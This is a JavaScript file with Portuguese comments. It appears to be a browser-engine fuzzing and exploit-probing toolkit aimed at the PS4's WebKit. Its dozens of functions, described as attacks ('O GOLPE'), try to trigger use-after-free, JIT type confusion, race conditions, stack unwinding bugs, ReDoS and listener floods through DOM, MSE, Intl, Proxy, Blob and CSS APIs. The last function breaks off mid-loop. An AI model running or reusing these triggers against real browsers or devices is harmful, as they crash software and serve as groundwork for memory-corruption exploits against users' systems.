                    // O PS4 suporta MP4/H.264
                    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E, mp4a.40.2"');
                    
                    // Cria dados falsos (não precisa ser vídeo real, só bytes para o parser)
                    const data = new Uint8Array(1024 * 1024); // 1MB
                    
                    let count = 0;
                    const interval = setInterval(() => {
                        count++;
                        if (sb.updating) return; // Espera estar livre
                        
                        try {
                            // 1. Inicia append
                            sb.appendBuffer(data);
                            
                            // 2. O GOLPE: Aborta imediatamente!
                            // Tenta cancelar a escrita na thread de media
                            sb.abort();
                            
                            // 3. Tenta remover o range imediatamente
                            sb.remove(0, 100);
                            
                        } catch(e) {}
                        
                        if (count > 200) {
                            clearInterval(interval);
                            log("Race Test finalizado.");
                            video.src = "";
                        }
                    }, 5); // Loop rápido
                    
                } catch(e) {
                    log("Erro MSE: " + e.message);
                }
            });
        }
function runCurrencyBomb() {
            log("Iniciando Ataque de Formatação Monetária...");
            
            try {
                // Cria uma string de moeda personalizada gigantesca
                // A libc tem que alocar espaço para o símbolo + número + agrupadores
                const currencyCode = "USD"; 
                const hugeNumber = 1e100; // Número com muitos zeros

                // Tenta usar um locale com regras de agrupamento complexas ou extensas
                // 'nu-arab' usa dígitos arábicos que podem ter larguras de byte diferentes
                const locales = [
                    "ar-SA-u-nu-arab", 
                    "zh-Hans-CN-u-nu-hanidec",
                    "en-US-u-cu-" + "A".repeat(100) // Tenta injetar moeda inválida longa (pode ser sanitizado, mas vale tentar)
                ];

                locales.forEach(loc => {
                    try {
                        log(`Formatando com locale: ${loc.substring(0, 20)}...`);
                        const fmt = new Intl.NumberFormat(loc, {
                            style: "currency",
                            currency: currencyCode,
                            useGrouping: true,
                            minimumFractionDigits: 100 // Força precisão extra
                        });
                        
                        // O GOLPE: Formatar um número que exige muita manipulação de string
                        const result = fmt.format(hugeNumber);
                        log("Resultado (Safe): " + result.length + " chars");
                    } catch(e) {
                        log("Erro Format: " + e.message);
                    }
                });

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: Array Sort Side-Effect (qsort) ---
        // Ataca a função 'qsort_s' da libc.
        // Modifica o array ENQUANTO ele está sendo ordenado.
        function runSortSideEffect() {
            log("Iniciando Ataque qsort() Side-Effect...");
            
            try {
                // Array grande o suficiente para ativar o QuickSort do C++
                const arr = new Array(2000).fill(0).map((_, i) => i);
                
                // O GOLPE: Função de comparação com efeitos colaterais
                arr.sort((a, b) => {
                    // Quando chegarmos a um ponto específico, destruímos o array
                    if (a === 1000 || b === 1000) {
                        log("Gatilho acionado! Alterando tamanho do array...");
                        arr.length = 1; // Reduz drasticamente o tamanho
                        // Tenta forçar garbage collection ou reutilização de memória
                        let junk = new Array(1000).fill(1.1);
                        return 0;
                    }
                    return a - b;
                });
                
                log("Sort finalizado. Tamanho final: " + arr.length);
                
            } catch(e) {
                log("Erro Sort (Proteção Ativa?): " + e.message);
                // Se crashar, não veremos este log.
            }
        }

        // --- TESTE 3: Exception Unwind Stack Smash ---
        // Ataca o mecanismo '_Unwind_Resume' do libkernel.
        // Cria uma pilha de chamadas profunda e lança exceções para estressar o desbobinador.
        function runUnwindStress() {
            log("Testando Stack Unwinding (libunwind)...");
            
            let depth = 0;
            const maxDepth = 5000; // Limite próximo do estouro de pilha

            function dive() {
                depth++;
                try {
                    if (depth < maxDepth) {
                        dive();
                    } else {
                        // Fundo do poço: Lança o erro inicial
                        throw "BOOM"; 
                    }
                } catch (e) {
                    // O C++ está desbobinando a pilha agora.
                    // Vamos dificultar a vida dele criando objetos pesados no catch
                    const heavy = new Float64Array(100).fill(Math.random());
                    
                    // Relança o erro ocasionalmente para manter o unwind ativo
                    if (depth % 100 === 0) {
                        throw e; 
                    }
                }
            }

            try {
                dive();
                log("Unwind concluído com segurança.");
            } catch(e) {
                log("Stack Overflow capturado (Safe): " + e);
            }
        }
 function runUpgradeRace() {
            log("Iniciando Upgrade Race...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";

            // 1. Enche o DOM com tags desconhecidas
            for(let i=0; i<1000; i++) {
                const el = document.createElement('x-boom');
                sandbox.appendChild(el);
            }

            log("Elementos criados. Definindo classe maligna...");

            // 2. O GOLPE: Define o elemento. O navegador vai pausar tudo para atualizar os 1000 nós.
            // O construtor roda para cada um.
            class BoomElement extends HTMLElement {
                constructor() {
                    super();
                    // Tenta sabotar o processo removendo o próximo irmão ou o pai
                    try {
                        if (this.nextSibling) {
                            this.parentNode.removeChild(this.nextSibling);
                        }
                        // Tenta mover este elemento para outro lugar durante o upgrade
                        document.body.appendChild(this);
                    } catch(e) {}
                }
            }

            setTimeout(() => {
                try {
                    customElements.define('x-boom', BoomElement);
                    log("Upgrade concluído (Seguro).");
                } catch(e) {
                    log("Erro Upgrade: " + e.message);
                }
                sandbox.innerHTML = "";
            }, 100);
        }

        // --- TESTE 2: CSS Trigonometry Infinity Crash ---
        // Usa as novas funções matemáticas (sin, cos, tan, pow) para gerar valores extremos.
        function runCSSMathCrash() {
            log("Aplicando Matemática CSS Extrema...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "<div id='math-target'>MATH</div>";
            const el = document.getElementById('math-target');
            
            // Lista de estilos perigosos
            const styles = [
                "width: calc(pow(999, 999) * 1px)", // Overflow Double
                "width: calc(1px / 0)",             // Divisão por zero direta
                "width: calc(tan(90deg) * 100px)",  // Infinito trigonométrico
                "transform: rotate(calc(infinity * 1deg))" // Rotação infinita
            ];

            let i = 0;
            const interval = setInterval(() => {
                if (i >= styles.length) {
                    clearInterval(interval);
                    log("Teste CSS finalizado.");
                    return;
                }
                
                log(`Aplicando: ${styles[i]}`);
                el.style = styles[i] + "; background: blue; height: 50px;";
                
                // Força layout
                const width = el.offsetWidth;
                log(`Layout calculado: ${width}`);
                
                i++;
            }, 500);
        }

        // --- TESTE 3: DOM Range Extract Corruption ---
        // Manipula Ranges (seleções de DOM) enquanto modifica a árvore.
        function runRangeCorruption() {
            log("Iniciando Range Extraction UAF...");
            const sandbox = document.getElementById('sandbox');
            
            // Cria uma árvore profunda
            sandbox.innerHTML = "<div>".repeat(50) + "<b>ALVO</b>" + "</div>".repeat(50);
            
            const range = document.createRange();
            // Seleciona o meio da árvore
            const target = sandbox.querySelector('b');
            range.selectNode(target);
            
            // Adiciona um listener que destrói o alvo assim que ele for movido
            target.addEventListener('DOMNodeRemovedFromDocument', () => {
                log("Nó removido! Tentando corromper Range...");
                // Tenta alterar o Range enquanto ele está processando a extração
                try {
                    range.setStart(sandbox, 0);
                    range.collapse(true);
                } catch(e) {}
            });

            try {
                log("Extraindo conteúdo do Range...");
                // O extractContents move o nó para um DocumentFragment.
                // Isso dispara eventos de mutação.
                const frag = range.extractContents();
                
                log("Extração bem sucedida.");
                sandbox.appendChild(frag); // Devolve para limpar
                
            } catch(e) {
                log("Erro Range: " + e.message);
            }
        }
 function runNormalizeUAF() {
            log("Iniciando Normalize UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            // Cria uma cadeia de nós de texto vazios ou adjacentes
            const div = document.createElement('div');
            const t1 = document.createTextNode("Texto 1 ");
            const t2 = document.createTextNode("Texto 2 ");
            const t3 = document.createTextNode(""); // Nó vazio (será removido)
            const t4 = document.createTextNode("Texto 3");
            
            div.appendChild(t1);
            div.appendChild(t2);
            div.appendChild(t3);
            div.appendChild(t4);
            sandbox.appendChild(div);

            // Monitora mudanças nos dados para tentar intervir
            // Este evento dispara quando o conteúdo do nó é alterado (durante o merge)
            function mutationHandler() {
                log("Mutação detectada durante normalização!");
                // O GOLPE: Remove o pai ou os irmãos imediatamente
                try {
                    sandbox.innerHTML = ""; // Limpa tudo
                    // Tenta corromper a memória alocando lixo
                    const junk = new Array(10000).join("X");
                } catch(e) {}
            }

            // Adiciona listeners em todos os nós
            t1.addEventListener('DOMCharacterDataModified', mutationHandler);
            t2.addEventListener('DOMCharacterDataModified', mutationHandler);

            log("Executando normalize()...");
            // O C++ vai iterar e fundir t1+t2, depois tentar remover t3...
            try {
                div.normalize();
                log("Normalização concluída (Seguro).");
            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: Recursive Select/Option Crash ---
        // Cria uma estrutura de formulário inválida (Select dentro de Option).
        // Força o renderizador a calcular o layout dessa impossibilidade.
        function runSelectCycle() {
            log("Criando Ciclo Impossível de Select/Option...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            sandbox.style.display = "block"; // Precisa estar visível para renderizar

            try {
                const select = document.createElement('select');
                const option = document.createElement('option');
                
                select.appendChild(option);
                sandbox.appendChild(select);
                
                // O GOLPE: Coloca o Select DENTRO da sua própria Option
                // Isso cria um ciclo na árvore de renderização (não necessariamente no DOM)
                log("Injetando Select dentro de Option...");
                option.appendChild(select);
                
                // Força renderização (Layout)
                // O motor tenta calcular a altura do menu, que contém ele mesmo...
                const height = select.offsetHeight;
                log("Layout calculado: " + height);
                
                // Tenta aninhamento profundo
                let deep = select;
                for(let i=0; i<500; i++) {
                    const s = document.createElement('select');
                    const o = document.createElement('option');
                    s.appendChild(o);
                    deep.appendChild(s);
                    deep = o;
                }
                log("Aninhamento profundo injetado.");
                
            } catch(e) {
                // HierarchyRequestError é o esperado se o JS bloquear.
                // Se passar e crashar depois, é bug do C++.
                log("Resultado: " + e.message);
            }
            
            // Limpeza
            setTimeout(() => { sandbox.innerHTML = ""; sandbox.style.display = "none"; }, 1000);
        }

        // --- TESTE 3: Link Rel Attribute State Confusion ---
        // Muda o tipo de link enquanto o recurso está carregando.
        // Tenta confundir o loader sobre como processar os dados (CSS vs Pré-load).
        function runLinkStateRace() {
            log("Iniciando Corrida de Estado de Link...");
            
            // Cria um link dinâmico
            const link = document.createElement('link');
            link.rel = "preload";
            link.as = "style";
            // Usa um Blob grande para dar tempo de mudar o estado durante o download
            const blob = new Blob([".test { color: red; } " + "/*padding*/".repeat(10000)], {type: 'text/css'});
            const url = URL.createObjectURL(blob);
            link.href = url;
            
            document.head.appendChild(link);
            
            log("Link adicionado (Preload). Mudando estado rapidamente...");
            
            let toggles = 0;
            const interval = setInterval(() => {
                toggles++;
                // Alterna violentamente entre stylesheet (ativo) e preload (passivo)
                // e remove/adiciona ao DOM para resetar o parser
                link.rel = (toggles % 2 === 0) ? "stylesheet" : "preload";
                
                if (toggles % 5 === 0) {
                    document.head.removeChild(link);
                    document.head.appendChild(link);
                }
                
                if (toggles > 100) {
                    clearInterval(interval);
                    log("Teste de Link finalizado.");
                    URL.revokeObjectURL(url);
                }
            }, 5); // 5ms é um bom intervalo para pegar race conditions de I/O
        }
function run1_NullByte() {
            log("[1] Testing Null Byte Injection...");
            try {
                const toxic = "A".repeat(500) + "%00" + "B".repeat(500);
                const res = decodeURIComponent(toxic);
                if (res.length > 1000 && res.indexOf("\0") > -1) log("Null Byte preservado (Safe).");
            } catch(e) { log("Error: " + e.message); }
        }

        // 2. Regex Complexity (Alvo: regex_error(error_complexity))
        function run2_RegexReDoS() {
            log("[2] Testing Regex Catastrophic Backtracking...");
            try {
                // Padrão que causa verificação exponencial: (a+)+
                const re = /((a+)+)+$/;
                const str = "a".repeat(25) + "!"; // O '!' no final força o recálculo total
                re.test(str);
                log("Regex Engine survived.");
            } catch(e) { log("Regex Error: " + e.message); }
        }

        // 3. Array Sort Proxy (Alvo: qsort_s)
        function run3_SortProxy() {
            log("[3] Testing Sort Side-Effects...");
            const arr = [1, 2, 3, 4, 5];
            const p = new Proxy(arr, {
                get(target, prop) {
                    if (prop === "length") return target.length;
                    // Se o sort ler um índice, mudamos o array
                    if (prop === "0") { arr.length = 0; return 99; }
                    return target[prop];
                }
            });
            try {
                Array.prototype.sort.call(p, (a, b) => a - b);
                log("Sort survived.");
            } catch(e) { log("Sort Error: " + e.message); }
        }

        // 4. Date Overflow (Alvo: mktime/asctime)
        function run4_DateOverflow() {
            log("[4] Testing Date Integer Overflow...");
            try {
                const d = new Date("2038-01-20"); // Limite 32-bit
                d.setFullYear(200000); // Ano absurdo
                const s = d.toISOString();
                log("Date processed: " + s.length);
            } catch(e) { log("Date Error: " + e.message); }
        }

        // 5. Intl Locale Stack Smash (Alvo: strxfrm/locale)
        function run5_IntlCrash() {
            log("[5] Testing Intl Locale Overflow...");
            try {
                const hugeLoc = "en-u-co-" + "phonebk".repeat(500);
                const fmt = new Intl.Collator(hugeLoc);
                fmt.compare("a", "b");
                log("Intl survived.");
            } catch(e) { log("Intl Error: " + e.message); }
        }

        // 6. TextDecoder Stream Split (Alvo: codecvt state)
        function run6_DecoderStream() {
            log("[6] Testing Decoder Stream State...");
            try {
                const dec = new TextDecoder("utf-8", {fatal: true});
                const chunk = new Uint8Array([0xF0, 0x9F]); // Meio emoji
                dec.decode(chunk, {stream: true});
                const bomb = new Uint8Array(1000).fill(0x41);
                dec.decode(bomb); // Muda o stream abruptamente
                log("Decoder survived.");
            } catch(e) { log("Decoder Error: " + e.message); }
        }

        // 7. Blob Slice Underflow (Alvo: 64-bit math)
        function run7_BlobUnderflow() {
            log("[7] Testing Blob Slice Underflow...");
            try {
                const b = new Blob(["TEST"]);
                // -1 em unsigned 64-bit é um número gigante
                const s = b.slice(0, -9223372036854775800); 
                log("Slice created. Size: " + s.size);
            } catch(e) { log("Blob Error: " + e.message); }
        }

        // 8. JSON Reviver UAF (Alvo: Parser Recursion)
        function run8_JSONReviver() {
            log("[8] Testing JSON Reviver Mutation...");
            const j = '{"a":1, "b":2}';
            JSON.parse(j, (k, v) => {
                if (k === "a") {
                    // Tenta deletar 'b' antes de o parser chegar lá
                    // (Conceitual, depende da implementação específica)
                    return {}; 
                }
                return v;
            });
            log("JSON survived.");
        }

        // 9. Stack Unwind Bomb (Alvo: _Unwind_Resume)
        function run9_UnwindBomb() {
            log("[9] Testing Stack Unwind...");
            let d = 0;
            function dive() {
                d++;
                try {
                    if (d < 3000) dive();
                    else throw "BOOM";
                } catch(e) { if (d===1500) throw e; }
            }
            try { dive(); log("Unwind Safe."); } catch(e) { log("Stack Safe."); }
        }

        // 10. Bad Array New Length (Alvo: operator new[])
        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }
 function run1_SelectionUAF() {
            log("[1] Selection API Logic...");
            const s = window.getSelection();
            const d = document.createElement('div');
            d.innerHTML = '<b>A</b><i>B</i><u>C</u>';
            document.body.appendChild(d);
            const r = document.createRange();
            r.selectNodeContents(d);
            s.addRange(r);
            
            // O GOLPE: Remove o nó central enquanto a seleção está ativa
            d.removeChild(d.childNodes[1]); 
            
            // Tenta forçar o update da seleção visual
            s.extend(d, 0); 
            log("Selection survived.");
            document.body.removeChild(d);
        }

        // 2. Drag & Drop State Confusion
        // Dispara eventos de 'drag' sem ter iniciado um arrasto real.
        function run2_DragDrop() {
            log("[2] Drag Event State Machine...");
            const d = document.createElement('div');
            document.body.appendChild(d);
            try {
                // Tenta confundir o controlador de Drag
                d.dispatchEvent(new DragEvent('dragstart'));
                d.dispatchEvent(new DragEvent('drop')); 
                d.dispatchEvent(new DragEvent('dragend'));
                log("Drag events processed.");
            } catch(e) { log("Drag Error: " + e.message); }
            document.body.removeChild(d);
        }

        // 3. Canvas Pattern Destruction
        // Cria um padrão, destroi a fonte e tenta usar.
        function run3_CanvasPattern() {
            log("[3] Canvas Pattern Lifecycle...");
            const c1 = document.createElement('canvas');
            const c2 = document.createElement('canvas');
            const ctx = c2.getContext('2d');
            const p = ctx.createPattern(c1, 'repeat');
            
            // Destrói a fonte (tamanho 0 libera buffer)
            c1.width = 0; 
            
            // Usa o padrão órfão
            ctx.fillStyle = p;
            ctx.fillRect(0,0,100,100);
            log("Pattern draw safe.");
        }

        // 4. FontFaceSet Iterator Invalidation
        // Modifica o conjunto de fontes enquanto itera sobre ele.
        function run4_FontIter() {
            log("[4] FontSet Iterator Logic...");
            if(!document.fonts) return log("No Font API.");
            const f = new FontFace('t', 'url(data:font/woff;base64,AAAA)');
            document.fonts.add(f);
            
            try {
                document.fonts.forEach(font => {
                    // O GOLPE: Deleta a fonte atual durante o loop
                    document.fonts.delete(font);
                    // Adiciona outra para reordenar memória
                    document.fonts.add(new FontFace('x', 'url(x)'));
                });
                log("Font iter safe.");
            } catch(e) { log("Font Error: " + e.message); }
        }

        // 5. XSLT document() Recursion
        // Usa XSLT para carregar o próprio documento infinitamente.
        function run5_XSLTRecurse() {
            log("[5] XSLT Logic Recursion...");
            const x = new XSLTProcessor();
            // XSL que tenta ler a si mesmo
            const xslt = `
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                <xsl:template match="/">
                    <xsl:copy-of select="document('')"/>
                </xsl:template>
                </xsl:stylesheet>`;
            const parser = new DOMParser();
            try {
                x.importStylesheet(parser.parseFromString(xslt, "text/xml"));
                x.transformToFragment(document, document);
                log("XSLT Safe.");
            } catch(e) { log("XSLT Error: " + e.message); }
        }

        // 6. Worker MessageChannel Race
        // Envia porta, fecha porta, termina worker.
        function run6_WorkerChannel() {
            log("[6] Worker Channel Race...");
            const mc = new MessageChannel();
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
            w.postMessage("port", [mc.port2]);
            mc.port1.close();
            w.terminate();
            log("Worker Race done.");
        }

        // 7. SVG SMIL Animation Race
        // Anima um elemento e remove-o do DOM imediatamente.
        function run7_SMILCrash() {
            log("[7] SVG SMIL Logic...");
            const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
            const anim = document.createElementNS("http://www.w3.org/2000/svg", "animate");
            anim.setAttribute("attributeName", "x");
            anim.setAttribute("to", "100");
            anim.setAttribute("dur", "1s");
            
            rect.appendChild(anim);
            svg.appendChild(rect);
            document.body.appendChild(svg);
            
            // Inicia relógio de animação
            svg.pauseAnimations();
            svg.unpauseAnimations();
            
            // O GOLPE: Remove enquanto anima
            document.body.removeChild(svg);
            log("SMIL Safe.");
        }

        // 8. Blob URL Async Revoke
        // Cria Blob, inicia leitura, revoga URL.
        function run8_BlobRevoke() {
            log("[8] Blob Async Revoke...");
            const b = new Blob(["A"]);
            const u = URL.createObjectURL(b);
            const xhr = new XMLHttpRequest();
            xhr.open("GET", u);
            xhr.send();
            
            // Revoga enquanto XHR está "downloading"
            URL.revokeObjectURL(u);
            log("Blob Revoke done.");
        }

        // 9. Iframe document.write Logic
        // Escreve no documento de um iframe enquanto ele carrega.
        function run9_DocWrite() {
            log("[9] Iframe Parser Logic...");
            const i = document.createElement('iframe');
            document.body.appendChild(i);
            i.contentDocument.write("<h1>TEST</h1>");
            i.contentDocument.close();
            i.contentDocument.open(); // Reabre e limpa
            i.contentDocument.write("<script>parent.log('Exec inside')<\/script>");
            document.body.removeChild(i);
            log("Doc Write Safe.");
        }

        // 10. CSS nth-child Recursion
        // Seletores estruturais complexos.
        function run10_CSSNth() {
            log("[10] CSS nth-child Logic...");
            const s = document.createElement('style');
            // Seletor que obriga a contar irmãos recursivamente
            s.textContent = "div:nth-last-child(2n+1) { color: red }";
            document.head.appendChild(s);
            
            const root = document.createElement('div');
            for(let i=0; i<2000; i++) {
                root.appendChild(document.createElement('div'));
            }
            document.getElementById('sandbox').appendChild(root);
            
            // Força layout
            const h = root.offsetHeight;
            log("CSS Recalc Safe.");
            document.head.removeChild(s);
            document.getElementById('sandbox').innerHTML = "";
        }

function runShapeShift() {
            log("[1] Iniciando Shape Shift Attack...");
            
            // 1. Cria arrays para treinar o motor (Polimorfismo)
            const arr = [1.1];
            const objArr = [{}];
            
            function victim(a, p) {
                // O motor tenta otimizar este acesso: a[0]
                // Se 'a' mudar de tipo aqui dentro, a leitura falha.
                return a[0];
            }

            // Treina o motor com arrays de Double
            for(let i=0; i<10000; i++) victim(arr);
            
            // Treina com objetos
            for(let i=0; i<10000; i++) victim(objArr);

            // O ATAQUE:
            const target = [1.1, 2.2];
            
            // Define um getter que muda a forma do array quando acessado
            // Transforma de "Array de Doubles" para "Array de Objetos" (Butterfly change)
            Object.defineProperty(target, "0", {
                get: () => {
                    target[1] = {}; // MUDANÇA DE FORMA (Shape Transition)
                    return 0x41414141; // Valor marcador
                }
            });

            try {
                log("Executando acesso corrompido...");
                // O motor pode ter cacheado o offset de memória para Double
                // Mas nós mudamos para Objeto no meio.
                const res = victim(target);
                
                log("Resultado: " + res);
                if (res === 1.1) log("Sem corrupção.");
                else log("ALERTA: Leitura inconsistente detectada!");
                
            } catch(e) { log("Erro Shape: " + e.message); }
        }

        // --- TESTE 2: Array Buffer Detach via GC Side-Effect ---
        // Usa JSON.parse com reviver para forçar GC e "Detaching" de ArrayBuffer.
        function runGCReentrancy() {
            log("[2] Armando GC Reentrancy Trap...");
            
            const buffer = new ArrayBuffer(1024 * 1024); // 1MB
            const view = new Uint8Array(buffer);
            
            // Cria um objeto JSON gigante para parsear
            const jsonString = '{"a": 1, ' + '"b": [1], '.repeat(5000) + '"c": 2}';
            
            let count = 0;
            
            try {
                JSON.parse(jsonString, (key, value) => {
                    if (key === "") return value; // Raiz
                    count++;
                    
                    // Em um ponto crítico, forçamos pressão de memória massiva
                    if (count === 2000) {
                        log("Trigger point! Forçando GC e Detach...");
                        
                        // 1. Esvazia o buffer (Neutering)
                        try {
                            // Transferência para worker mata o buffer na thread principal
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/js"})));
                            w.postMessage(buffer, [buffer]);
                            w.terminate();
                        } catch(e) {}
                        
                        // 2. Aloca lixo para o GC rodar e mover coisas
                        const trash = [];
                        for(let i=0; i<10000; i++) trash.push(new Array(100).join("X"));
                    }
                    
                    return value;
                });
                
                // Tenta acessar o buffer neutrado. 
                // Se o motor não atualizou a referência, crash (UAF).
                log("Parse concluído. Verificando buffer...");
                if (buffer.byteLength === 0) {
                    log("Buffer está neutrado (Safe). Tendo acesso: " + view[0]);
                } else {
                    log("Buffer ainda vivo (Strange).");
                }
                
            } catch(e) {
                // Se der erro de acesso de memória aqui, é o que queremos
                log("Erro Crítico: " + e.message);
            }
        }

        // --- TESTE 3: Async Generator State Corruption ---
        // Cria uma cadeia de geradores que dependem uns dos outros e falham.
        // Tenta corromper a "máquina de estados" que o motor salva na heap.
        function runGeneratorSmash() {
            log("[3] Iniciando Async Generator State Smash...");
            
            async function* gen(depth) {
                try {
                    if (depth > 0) {
                        // Recursão de geradores
                        yield* gen(depth - 1);
                    } else {
                        // Fundo: Espera e lança erro
                        await new Promise(r => setTimeout(r, 10));
                        throw "BOOM";
                    }
                } catch (e) {
                    // Durante o 'catch', o motor tem de restaurar o estado do gerador anterior.
                    // Se fizermos operações pesadas aqui, podemos corromper esse estado salvo.
                    
                    // Aloca memória para mover o heap
                    const junk = new Float64Array(1000).fill(1.23);
                    
                    if (depth % 100 === 0) log("Unwinding Generator " + depth);
                    throw e; // Re-lança para continuar o desbobinar
                }
            }

            (async () => {
                try {
                    const g = gen(2000); // Profundidade alta
                    while (true) {
                        await g.next();
                    }
                } catch(e) {
                    log("Gerador finalizado. Erro: " + e);
                }
            })();
        }
 function runResizeLoop() {
            log("Iniciando ResizeObserver Chaos...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            const el = document.createElement('div');
            el.className = "container";
            sandbox.appendChild(el);

            let count = 0;
            const ro = new ResizeObserver(entries => {
                count++;
                // O GOLPE: Altera o layout de forma a causar novo resize
                // Usa valores fracionados para tentar enganar a deteção de igualdade
                el.style.width = (100 + Math.random()) + "px";
                
                // Cria elementos filhos para aumentar a complexidade do layout
                if (count % 10 === 0) {
                    const child = document.createElement('div');
                    child.style.height = "10px";
                    el.appendChild(child);
                }
                
                // Tenta forçar layout síncrono dentro do callback
                const force = el.scrollHeight;
                
                if (count > 2000) {
                    ro.disconnect();
                    log("Loop finalizado (Browser limitou).");
                }
            });

            ro.observe(el);
            log("Observer ativo. Verifique se a aba congela.");
        }

        // --- TESTE 2: Iframe Blob Reload Race (The Zombie Blob) ---
        // Tenta carregar um Blob num iframe e revogá-lo no momento crítico.
        function runZombieBlob() {
            log("Iniciando Zombie Blob Race...");
            
            const ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            
            let attempts = 0;
            const maxAttempts = 50;

            function attempt() {
                attempts++;
                if (attempts > maxAttempts) {
                    log("Teste finalizado. Resource Loader estável.");
                    document.body.removeChild(ifr);
                    return;
                }

                // 1. Cria conteúdo
                const blob = new Blob(["<h1>ZOMBIE DATA " + attempts + "</h1><script>parent.log('Loaded')<\/script>"], {type: 'text/html'});
                const url = URL.createObjectURL(blob);
                
                // 2. Atribui ao iframe
                ifr.src = url;
                
                // 3. O GOLPE: Race Condition
                // Recarrega o iframe e revoga a URL quase simultaneamente
                setTimeout(() => {
                    try {
                        ifr.contentWindow.location.reload();
                        // Tenta revogar exatamente quando o reload pede o recurso
                        URL.revokeObjectURL(url);
                        
                        // Tenta limpar o blob da memória (se possível via GC)
                        // blob = null; // (Conceitual)
                    } catch(e) {}
                    
                    // Próxima tentativa
                    setTimeout(attempt, 50);
                }, 10);
            }
            
            attempt();
        }

        // --- TESTE 3: matchMedia Listener Flood ---
        // Regista milhares de ouvintes para mudanças de media query.
        // Ataca o sistema de notificações de estilo.
        function runMediaFlood() {
            log("Iniciando matchMedia Listener Flood...");
            
            const queries = [];
            const limit = 5000;
            
            try {
                for(let i=0; i<limit; i++) {
                    // Cria queries únicas para evitar deduplicação
                    const mq = window.matchMedia(`(min-width: ${i}px)`);
                    mq.addListener(() => { /* No-op, apenas consome recursos */ });
                    queries.push(mq);
                }
                log(`${limit} Listeners registados.`);
                
                // O GOLPE: Redimensiona um iframe para disparar TODOS os listeners
                const ifr = document.createElement('iframe');
                ifr.style.width = "10px";
                document.body.appendChild(ifr);
                
                log("Disparando eventos de resize...");
                let width = 10;
                const interval = setInterval(() => {
                    width += 100;
                    ifr.style.width = width + "px";
                    
                    if (width > limit) {
                        clearInterval(interval);
                        document.body.removeChild(ifr);
                        log("Flood finalizado.");
                    }
                }, 10);
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
function runAdoptionUAF() {
            log("Iniciando Adoption Agency Attack...");
            
            const f = document.getElementById('f');
            const doc = f.contentDocument;
            
            try {
                doc.open();
                
                // O GOLPE:
                // 1. Cria uma estrutura que ativa o Adoption Agency (tags de formatação mal aninhadas)
                // 2. No meio, um script remove o elemento pai 'a'
                const payload = `
                    <a id="a">
                        <b>
                            <script>
                                parent.log("Script executado dentro do parser. Destruindo 'a'...");
                                const a = document.getElementById('a');
                                a.parentNode.removeChild(a);
                                // Tenta alocar lixo para ocupar a memória
                                const trash = new Array(1000).fill(1.1);
                            <\/script>
                            <i>Bug?</i>
                        </b>
                    </a>
                `;
                
                // document.write é síncrono e invoca o parser imediatamente
                doc.write(payload);
                doc.close();
                
                log("Parser sobreviveu.");
                
            } catch(e) {
                log("Erro Parser: " + e.message);
            }
        }

        // --- TESTE 2: Array.splice Proxy Trap ---
        // Usa um Proxy para encolher o array DURANTE a operação splice.
        function runSpliceTrap() {
            log("Armando Array.splice Trap...");
            
            try {
                const target = [1, 2, 3, 4, 5, 6];
                let trapped = false;
                
                const p = new Proxy(target, {
                    get(t, prop) {
                        // splice lê 'length' e depois os índices
                        // Se lermos um índice alto, significa que o C++ já calculou o tamanho
                        if (prop === "3" && !trapped) {
                            trapped = true;
                            log("Splice leu índice 3. Encolhendo array...");
                            t.length = 0; // ZERA o array no meio da operação
                            // Tenta confundir a memória
                            t.push(0x41414141);
                        }
                        return t[prop];
                    }
                });

                log("Executando splice(0, 3)...");
                // O splice vai tentar mover elementos.
                // Se o motor não checar o tamanho novamente, vai escrever em índices inválidos.
                Array.prototype.splice.call(p, 0, 3);
                
                log("Splice finalizado. Tamanho: " + target.length);
                
            } catch(e) {
                log("Erro Splice: " + e.message);
            }
        }

        // --- TESTE 3: Map Iterator Invalidation Crash ---
        // Modifica drasticamente um Map enquanto ele está sendo iterado.
        function runMapIterator() {
            log("Testando Map Iterator Stability...");
            
            try {
                const map = new Map();
                for(let i=0; i<100; i++) map.set(i, i);
                
                let count = 0;
                
                // Itera sobre o mapa
                map.forEach((val, key) => {
                    count++;
                    if (count === 10) {
                        log("Gatilho ativado no item 10! Limpando Map...");
                        
                        // 1. Limpa o mapa (destrói a estrutura interna)
                        map.clear();
                        
                        // 2. Adiciona novos itens imediatamente para reutilizar a memória
                        // O iterador C++ ainda tem um ponteiro para a estrutura antiga?
                        for(let k=0; k<50; k++) map.set("new"+k, k);
                        
                        // Força GC (tentativa)
                        const garbage = new Array(10000).fill(1.1);
                    }
                });
                
                log("Iteração concluída. Map size: " + map.size);
                
            } catch(e) {
                log("Erro Map: " + e.message);
            }
        }
function runDictionaryTransition() {
            log("[1] Iniciando Dictionary Mode Transition...");
            
            try {
                const obj = {};
                
                // 1. Adiciona propriedades para criar uma "Forma" inicial
                for (let i = 0; i < 100; i++) obj["p" + i] = i;
                
                // Função de acesso quente (para o motor otimizar)
                function access(o) {
                    return o.p1;
                }
                
                // Treina o motor
                for(let i=0; i<1000; i++) access(obj);
                
                log("Objeto 'aquecido'. Iniciando transição violenta...");
                
                // 2. O GOLPE: Adiciona milhares de propriedades e deleta aleatoriamente
                // Isso força o JSC a desistir da estrutura linear e usar um Hash Map (Dicionário)
                // Se o 'access' rodar no meio disso usando offset antigo, lê memória errada.
                
                const interval = setInterval(() => {
                    // Adiciona massivamente
                    for(let i=100; i<2000; i++) obj["p" + i] = i;
                    
                    // Deleta para fragmentar
                    for(let i=0; i<2000; i+=2) delete obj["p" + i];
                    
